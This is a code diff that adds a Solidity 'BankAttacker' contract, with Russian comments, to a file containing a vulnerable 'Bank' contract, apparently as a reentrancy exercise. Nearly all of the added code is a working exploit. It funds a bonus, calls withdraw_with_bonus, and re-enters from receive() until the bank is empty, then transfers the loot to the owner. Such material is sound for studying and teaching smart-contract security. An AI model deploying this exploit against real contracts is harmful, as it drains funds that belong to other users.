@@ -72,3 +72,43 @@ contract Bank {
         completed = true;
     }
 }
+
+
+
+
+interface IBank {
+    function withdraw_with_bonus() external;
+    function giveBonusToUser(address _who) external payable;
+    function setCompleted() external payable;
+}
+
+contract BankAttacker {
+    IBank public bank;
+    address payable public owner;
+
+    constructor(address _bankAddress) {
+        bank = IBank(_bankAddress);
+        owner = payable(msg.sender);
+    }
+
+
+    function attack() external payable {
+        require(msg.sender == owner, "Only the owner can initiate the attack.");
+        require(msg.value >= 0.01 ether, "Minimum attack value not met.");
+        
+        // Вызываем giveBonusToUser, чтобы установить контекст для атаки.
+        bank.giveBonusToUser{value: msg.value / 2}(address(this));
+        
+        // Вызываем withdraw_with_bonus, чтобы начать реентранси.
+        bank.withdraw_with_bonus();
+    }
+
+    // Реентранси происходит здесь.
+    receive() external payable {
+        if (address(bank).balance != 0) {
+            bank.withdraw_with_bonus();
+        } else {
+            owner.transfer(address(this).balance);
+        }
+    }
+}
